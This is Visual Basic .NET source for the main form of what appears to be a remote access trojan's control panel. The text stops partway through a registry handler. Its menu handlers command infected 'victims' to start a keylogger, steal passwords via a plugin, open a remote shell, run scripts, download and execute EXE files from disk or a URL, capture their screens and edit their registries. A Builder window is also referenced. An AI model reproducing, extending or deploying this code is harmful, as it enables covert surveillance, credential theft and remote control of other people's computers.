Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Threading
Imports System.Windows.Forms
Imports System.Windows.Forms.ListView
Imports Microsoft.VisualBasic.Devices
Imports System.Runtime.CompilerServices

Public Class Form1

    Public CEL As Client
    Public PMON As Boolean
    Public port As Integer
    Public S As SK

    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & ind.Y & "!")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
    Private Sub UninstallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles UninstallToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & ind.Y & "~")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
    Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
        L1.View = System.Windows.Forms.View.Details
    End Sub

    Private Sub DisconnectToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DisconnectToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateSetComplex(current.Tag, Nothing, "CN", New Object() {False}, Nothing, Nothing, False, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub
    Public Sub dsk()
        Dim num As Integer = 0
        Dim item As Client = Nothing
        Do While True
            Thread.Sleep(500)
            Try
                If ((ind.F.IMG Is ind.F.L1.SmallImageList) AndAlso (ind.ISAd.Count <= 10)) Then
                    num += 1
                    If (num > S.Online2.Count) Then
                        num = 1
                    End If
                    If (S.Online2.Count > 0) Then
                        item = DirectCast(S.Online2.Item(num), Client)
                        If ((Not item.Isend And (Not item.L Is Nothing)) AndAlso (item.L.SubItems.Count > 0)) Then
                            ind.ISAd.Add(item)
                            item.Isend = True
                            item.Send(String.Concat(New String() {"CAP", ind.Y, Conversions.ToString(ind.F.IMG.ImageSize.Width), ind.Y, Conversions.ToString(ind.F.IMG.ImageSize.Height)}))
                        End If
                    End If
                End If
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
        Loop
    End Sub


    Private Sub FlagToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FlagToolStripMenuItem.Click
        SmallToolStripMenuItem.Checked = False
        MediumToolStripMenuItem.Checked = False
        LargeToolStripMenuItem.Checked = False
        SmallDesktopToolStripMenuItem.Checked = False
        FlagToolStripMenuItem.Checked = True
        L1.SmallImageList = IMG2
        L1.LargeImageList = IMG2
        Dim items As ListViewItemCollection = L1.Items
        SyncLock items
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ImageKey = (current.SubItems.Item(ind.hco).Text & ".png")
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End SyncLock
        L1.FX()
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        ProjectData.EndApp()
    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As EventArgs) Handles MyBase.Load
        Logs1.Show()
        nt.Show()
        nt.Visible = False
        Control.CheckForIllegalCrossThreadCalls = False
        ind.F = Me
        Me.Text = ind.vr
        Me.Show()

        Dim str As String
        For Each str In Directory.GetFiles((Application.StartupPath & "\plugin\"), "*.dll")
            Dim item As New plg(New FileInfo(str).Name.ToLower)
            ind.Plug.Add(item)
        Next
        Dim str2 As String
        For Each str2 In Strings.Split("PEPSI-c.dll,PEPSI-CH.dll,PEPSI-F.dll,PEPSI-R.dll,pw.dll,PEPSI-S.dll", ",", -1, CompareMethod.Binary)
            If (ind.GETPLG(str2, Nothing) Is Nothing) Then
                Interaction.MsgBox(("Missing dll >> " & str2), MsgBoxStyle.ApplicationModal, Nothing)
            End If
        Next
Label_00C9:
        Try
            Dim str3 As String = Interaction.InputBox("Enter Port", "PORT", FN.GTV("port", "9191"), -1, -1)
            If (str3.Length = 0) Then
                End
            End If
            port = Conversions.ToInteger(str3)
            S = New SK(Conversions.ToInteger(str3))
            FN.STV("port", str3)
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            Interaction.MsgBox(exception.Message, MsgBoxStyle.ApplicationModal, Nothing)
            ProjectData.ClearProjectError()
            GoTo Label_00C9
        End Try
        ind.W = S
        Dim aa As New Thread(New ThreadStart(AddressOf dsk))
        aa.Start()
        Logs1.Timer1.Enabled = True
        Timer1.Enabled = True
    End Sub

    Private Sub FromDISKToolStripMenuItem1_Click(sender As Object, e As EventArgs) Handles FromDISKToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim dialog As New OpenFileDialog
            dialog.Filter = "EXE|*.exe"
            dialog.FileName = ""
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = FN.SB(Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(dialog.FileName), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("up" & ind.Y)
                stream.Write(FN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim tt As New Thread(New ParameterizedThreadStart(AddressOf ind.SendTo), 1)
                tt.Start(New Object() {L1.SelectedItems, stream.ToArray, Color.Red})
            End If
        End If
    End Sub

    Private Sub FromDiskToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles FromDiskToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim dialog As New OpenFileDialog
            dialog.FileName = ""
            If (dialog.ShowDialog = DialogResult.OK) Then
                Dim cM As Boolean = True
                Dim buffer As Byte() = FN.SB(Convert.ToBase64String(FN.ZIP(File.ReadAllBytes(dialog.FileName), cM)))
                Dim stream As New MemoryStream
                Dim s As String = ("rn" & ind.Y & New FileInfo(dialog.FileName).Extension & ind.Y)
                stream.Write(FN.SB(s), 0, s.Length)
                stream.Write(buffer, 0, buffer.Length)
                Dim aa As New Thread(New ParameterizedThreadStart(AddressOf ind.SendTo), 1)
                aa.Start(New Object() {L1.SelectedItems, stream.ToArray, Color.Red})
            End If
        End If
    End Sub

    Private Sub FromLINKToolStripMenuItem1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FromLINKToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim str2 As String = ("up" & ind.Y)
            Dim str As String = Interaction.InputBox("Enter URL", "Update From LINK", "", -1, -1)
            If (str <> "") Then
                Dim enumerator As IEnumerator = Nothing
                str2 = (str2 & str)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str2}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str2 = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Red
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub FromLinkToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles FromLinkToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim furl As New FURL
            furl.ShowDialog(Me)
            If furl.IsOK Then
                Dim enumerator As IEnumerator = Nothing
                Dim str As String = String.Concat(New String() {"rn", ind.Y, furl.TextBox2.Text, ind.Y, furl.TextBox1.Text})
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Yellow
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub GetPasswordsToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles GetPasswordsToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("pw.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Red
                    ind.SendPlug(DirectCast(current.Tag, Client), p, True)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub KeyloggerToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles KeyloggerToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {"kl"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub L1_DoubleClick(ByVal sender As Object, ByVal e As EventArgs) Handles L1.DoubleClick
        If (L1.SelectedItems.Count > 0) Then
            DirectCast(L1.SelectedItems.Item(0).Tag, Client).Send("inf")
        End If
    End Sub

    Private Sub L1_KeyDown(ByVal sender As Object, ByVal e As KeyEventArgs) Handles L1.KeyDown
        Select Case e.KeyCode
            Case Keys.A
                If My.Computer.Keyboard.CtrlKeyDown Then
                    Dim items As ListViewItemCollection = L1.Items
                    SyncLock items
                        Dim enumerator As IEnumerator = Nothing
                        Try
                            enumerator = L1.Items.GetEnumerator
                            Do While enumerator.MoveNext
                                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                                current.Selected = True
                            Loop
                        Finally
                            If TypeOf enumerator Is IDisposable Then
                                TryCast(enumerator, IDisposable).Dispose()
                            End If
                        End Try
                    End SyncLock
                End If
                Exit Select
            Case Keys.Space
                L1.FX()
                Exit Select
        End Select
    End Sub

    Private Sub LargeToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles LargeToolStripMenuItem.Click
        SmallToolStripMenuItem.Checked = False
        Dim box As PictureBox = P1
        SyncLock box
            CEL = Nothing
        End SyncLock
        MediumToolStripMenuItem.Checked = False
        LargeToolStripMenuItem.Checked = True
        SmallDesktopToolStripMenuItem.Checked = True
        FlagToolStripMenuItem.Checked = False
        L1.SmallImageList = IMG
        L1.LargeImageList = IMG
        IMG.Images.Clear()
        Dim size As New Size(200, 160)
        IMG.ImageSize = size
        IMG.Images.Add("s", My.Resources.GA)
        Dim items As ListViewItemCollection = L1.Items
        SyncLock items
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ImageKey = "s"
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End SyncLock
        L1.FX()
    End Sub

    Private Sub ListToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ListToolStripMenuItem.Click
        L1.View = Windows.Forms.View.LargeIcon
    End Sub

    Private Sub L1_SelectedIndexChanged(ByVal sender As Object, ByVal e As EventArgs) Handles L1.SelectedIndexChanged
        SEL.Text = ("Sel[" & Conversions.ToString(L1.SelectedItems.Count) & "]")
        If (L1.SelectedItems.Count > 0) Then
            ind.ensr = False
        End If
        Dim box As PictureBox = P1
        SyncLock box
            If ((L1.SelectedItems.Count = 1) And (L1.SmallImageList Is IMG2)) Then
                CEL = DirectCast(L1.SelectedItems.Item(0).Tag, Client)
                If (Not CEL.snf Is Nothing) Then
                    ind.F.L2.Items.Item(0).SubItems.Item(1).Text = CEL.snf(0)
                    ind.F.L2.Items.Item(1).SubItems.Item(1).Text = CEL.snf(1)
                    ind.F.L2.Items.Item(2).SubItems.Item(1).Text = ("%" & CEL.snf(2) & "%")
                    ind.F.L2.Items.Item(3).SubItems.Item(1).Text = CEL.snf(3)
                    ind.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                Else
                    ind.F.L2.Items.Item(0).SubItems.Item(1).Text = ""
                    ind.F.L2.Items.Item(1).SubItems.Item(1).Text = ""
                    ind.F.L2.Items.Item(2).SubItems.Item(1).Text = ""
                    ind.F.L2.Items.Item(3).SubItems.Item(1).Text = ""
                    ind.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                    CEL.Send("inf")
                End If
                If (Not CEL.pc Is Nothing) Then
                    Dim box2 As PictureBox = ind.F.P1
                    SyncLock box2
                        ind.F.P1.Image = DirectCast(CEL.pc.Clone, Image)
                    End SyncLock
                End If
                CEL.Send(String.Concat(New String() {"CAP", ind.Y, Conversions.ToString(P1.Width), ind.Y, Conversions.ToString(P1.Height)}))
            Else
                ind.F.P1.Image = Nothing
                CEL = Nothing
            End If
        End SyncLock
    End Sub

    Private Sub MediumToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles MediumToolStripMenuItem.Click
        SmallToolStripMenuItem.Checked = False
        Dim box As PictureBox = P1
        SyncLock box
            CEL = Nothing
        End SyncLock
        MediumToolStripMenuItem.Checked = True
        LargeToolStripMenuItem.Checked = False
        SmallDesktopToolStripMenuItem.Checked = True
        FlagToolStripMenuItem.Checked = False
        L1.SmallImageList = IMG
        L1.LargeImageList = IMG
        IMG.Images.Clear()
        Dim size As New Size(160, 100)
        IMG.ImageSize = size
        IMG.Images.Add("s", My.Resources.GA)
        Dim items As ListViewItemCollection = L1.Items
        SyncLock items
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ImageKey = "s"
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End SyncLock
        L1.FX()
    End Sub

    Private Sub OpenChatToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OpenChatToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("PEPSI-CH.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Red
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub OpenFolderToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles OpenFolderToolStripMenuItem.Click
        Try
            If Not Directory.Exists(Conversions.ToString(NewLateBinding.LateGet(L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))) Then
                Directory.CreateDirectory(Conversions.ToString(NewLateBinding.LateGet(L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
            End If
            Dim objArray As Object() = New Object(1 - 1) {}
            Dim tag As Object = L1.SelectedItems.Item(0).Tag
            objArray(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
            Dim arguments As Object() = objArray
            Dim copyBack As Boolean() = New Boolean() {True}
            NewLateBinding.LateCall(Nothing, GetType(Process), "Start", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                NewLateBinding.LateSetComplex(tag, Nothing, "folder", New Object() {RuntimeHelpers.GetObjectValue(arguments(0))}, Nothing, Nothing, True, True)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub P1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles P1.Click
        If (Not CEL Is Nothing) Then
            CEL.Send(String.Concat(New String() {"CAP", ind.Y, Conversions.ToString(P1.Width), ind.Y, Conversions.ToString(P1.Height)}))
        End If
    End Sub

    Private Sub P1_MouseEnter(ByVal sender As Object, ByVal e As EventArgs) Handles P1.MouseEnter
        If (Not CEL Is Nothing) Then
            P1.Cursor = Cursors.Hand
        Else
            P1.Cursor = Cursors.Default
        End If
    End Sub

    Private Sub P1_Resize(ByVal sender As Object, ByVal e As EventArgs) Handles P1.Resize
        P1.Height = CInt(Math.Round(CDbl((CDbl(P1.Width) / 1.5))))
    End Sub

    Private Sub RenameToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RenameToolStripMenuItem.Click
        Dim s As String = Interaction.InputBox("Enter New Name", "Rename Victim", "", -1, -1)
        If (s.Length > 0) Then
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    Try
                        NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {String.Concat(New String() {"prof", ind.Y, "~", ind.Y, "vn", ind.Y, FN.ENB(s)})}, Nothing, Nothing, Nothing, True)
                        current.Text = (s & "_" & Strings.Split(current.Text, "_", -1, CompareMethod.Binary)((Strings.Split(current.Text, "_", -1, CompareMethod.Binary).Length - 1)))
                        Continue Do
                    Catch exception1 As Exception
                        ProjectData.SetProjectError(exception1)
                        Dim exception As Exception = exception1
                        ProjectData.ClearProjectError()
                        Continue Do
                    End Try
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RestartToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles RestartToolStripMenuItem.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                Try
                    NewLateBinding.LateCall(current.Tag, Nothing, "Send", New Object() {("un" & ind.Y & "@")}, Nothing, Nothing, Nothing, True)
                    Continue Do
                Catch exception1 As Exception
                    ProjectData.SetProjectError(exception1)
                    Dim exception As Exception = exception1
                    ProjectData.ClearProjectError()
                    Continue Do
                End Try
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ScriptToolStripMenuItem_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ScriptToolStripMenuItem.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim script As New Script
            script.ShowDialog(Me)
            If (script.Code.Length > 0) Then
                Dim enumerator As IEnumerator = Nothing
                Dim strArray As String() = New String(5 - 1) {}
                strArray(0) = "rn"
                strArray(1) = ind.Y
                strArray(2) = script.RunAs
                strArray(3) = ind.Y
                Dim cM As Boolean = True
                strArray(4) = Convert.ToBase64String(FN.ZIP(FN.SB(script.Code), cM))
                Dim str As String = String.Concat(strArray)
                Try
                    enumerator = L1.SelectedItems.GetEnumerator
                    Do While enumerator.MoveNext
                        Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                        Try
                            Dim arguments As Object() = New Object() {str}
                            Dim copyBack As Boolean() = New Boolean() {True}
                            NewLateBinding.LateCall(current.Tag, Nothing, "Send", arguments, Nothing, Nothing, copyBack, True)
                            If copyBack(0) Then
                                str = CStr(Conversions.ChangeType(RuntimeHelpers.GetObjectValue(arguments(0)), GetType(String)))
                            End If
                            current.ForeColor = Color.Red
                            Continue Do
                        Catch exception1 As Exception
                            ProjectData.SetProjectError(exception1)
                            Dim exception As Exception = exception1
                            ProjectData.ClearProjectError()
                            Continue Do
                        End Try
                    Loop
                Finally
                    If TypeOf enumerator Is IDisposable Then
                        TryCast(enumerator, IDisposable).Dispose()
                    End If
                End Try
            End If
        End If
    End Sub

    Private Sub Timer1_Elapsed(ByVal sender As Object, ByVal e As Timers.ElapsedEventArgs) Handles Timer1.Elapsed
        Try
            Dim box As PictureBox = P1
            SyncLock box
                If ((CEL Is Nothing) AndAlso (ind.F.L2.Items.Item(0).SubItems.Item(1).Text <> "")) Then
                    ind.F.L2.Items.Item(0).SubItems.Item(1).Text = ""
                    ind.F.L2.Items.Item(1).SubItems.Item(1).Text = ""
                    ind.F.L2.Items.Item(2).SubItems.Item(1).Text = ""
                    ind.F.L2.Items.Item(3).SubItems.Item(1).Text = ""
                    ind.F.L2.AutoResizeColumns(ColumnHeaderAutoResizeStyle.ColumnContent)
                    ind.F.P1.Image = Nothing
                End If
            End SyncLock
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub ToolStripStatusLabel2_Click(ByVal sender As Object, ByVal e As EventArgs)
        Dim b As New ColorDialog
        b.ShowDialog()
        L1.BackColor = b.Color
    End Sub

    Private Sub ToolStripStatusLabel3_Click(ByVal sender As Object, ByVal e As EventArgs)
        Logs1.Hide()
    End Sub

    Private Sub ToolStripStatusLabel4_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToolStripStatusLabel4.Click
        Builder.Show()
    End Sub

    Private Sub ToolStripMenuItem2_Click(ByVal sender As Object, ByVal e As EventArgs) Handles ToolStripMenuItem2.Click
        Try
            If Not Directory.Exists(Conversions.ToString(NewLateBinding.LateGet(Me.L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))) Then
                Directory.CreateDirectory(Conversions.ToString(NewLateBinding.LateGet(Me.L1.SelectedItems.Item(0).Tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
            End If
            Dim objArray As Object() = New Object(1 - 1) {}
            Dim tag As Object = Me.L1.SelectedItems.Item(0).Tag
            objArray(0) = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(tag, Nothing, "folder", New Object(0 - 1) {}, Nothing, Nothing, Nothing))
            Dim arguments As Object() = objArray
            Dim copyBack As Boolean() = New Boolean() {True}
            NewLateBinding.LateCall(Nothing, GetType(Process), "Start", arguments, Nothing, Nothing, copyBack, True)
            If copyBack(0) Then
                NewLateBinding.LateSetComplex(tag, Nothing, "folder", New Object() {RuntimeHelpers.GetObjectValue(arguments(0))}, Nothing, Nothing, True, True)
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub

    Private Sub SmallToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles SmallToolStripMenuItem.Click
        SmallToolStripMenuItem.Checked = False
        Dim box As PictureBox = P1
        SyncLock box
            CEL = Nothing
        End SyncLock
        MediumToolStripMenuItem.Checked = True
        LargeToolStripMenuItem.Checked = False
        SmallDesktopToolStripMenuItem.Checked = True
        FlagToolStripMenuItem.Checked = False
        L1.SmallImageList = IMG
        L1.LargeImageList = IMG
        IMG.Images.Clear()
        Dim size As New Size(60, 40)
        IMG.ImageSize = size
        IMG.Images.Add("s", My.Resources.GA)
        Dim items As ListViewItemCollection = L1.Items
        SyncLock items
            Dim enumerator As IEnumerator = Nothing
            Try
                enumerator = L1.Items.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ImageKey = "s"
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End SyncLock
        L1.FX()
    End Sub


    Private Sub ToolStripStatusLabel1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripStatusLabel1.Click
        About.Show()
    End Sub

    Private Sub ToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        L1.View = System.Windows.Forms.View.Details
    End Sub

    Private Sub ToolStripMenuItem4_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem4.Click
        Dim v As New ColorDialog
        v.ShowDialog()
        L1.ForeColor = v.Color
    End Sub

    Private Sub ToolStripMenuItem3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem3.Click
        Dim b As New ColorDialog
        b.ShowDialog()
        L1.BackColor = b.Color
    End Sub

    Private Sub ToolStripMenuItem7_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem7.Click
        L1.GridLines = True
    End Sub

    Private Sub ToolStripMenuItem8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ToolStripMenuItem8.Click
        L1.GridLines = False
    End Sub

    Private Sub RemoteShellToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RemoteShellToolStripMenuItem1.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                NewLateBinding.LateCall(current.Tag, Nothing, "send", New Object() {"rss"}, Nothing, Nothing, Nothing, True)
            Loop
        Finally
            If TypeOf enumerator Is IDisposable Then
                TryCast(enumerator, IDisposable).Dispose()
            End If
        End Try
    End Sub

    Private Sub ProcessManagerToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ProcessManagerToolStripMenuItem1.Click
        If (L1.SelectedItems.Count <> 0) Then
            Dim enumerator As IEnumerator = Nothing
            Dim p As plg = ind.GETPLG("PEPSI-R.dll", Nothing)
            Try
                enumerator = L1.SelectedItems.GetEnumerator
                Do While enumerator.MoveNext
                    Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                    current.ForeColor = Color.Red
                    ind.SendPlug(DirectCast(current.Tag, Client), p, False)
                Loop
            Finally
                If TypeOf enumerator Is IDisposable Then
                    TryCast(enumerator, IDisposable).Dispose()
                End If
            End Try
        End If
    End Sub

    Private Sub RegistryToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles RegistryToolStripMenuItem1.Click
        Dim enumerator As IEnumerator = Nothing
        Try
            enumerator = L1.SelectedItems.GetEnumerator
            Do While enumerator.MoveNext
                Dim current As ListViewItem = DirectCast(enumerator.Current, ListViewItem)
                If (ind.Gform(Conversions.ToString(Operators.ConcatenateObject("reg", NewLateBinding.LateGet(current.Tag, Nothing, "ip", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))) Is Nothing) Then
                    Dim reg As New Reg
                    reg.Name = Conversions.ToString(Operators.ConcatenateObject("reg", NewLateBinding.LateGet(current.Tag, Nothing, "ip", New Object(0 - 1) {}, Nothing, Nothing, Nothing)))
                    reg.sk = DirectCast(current.Tag, Client)
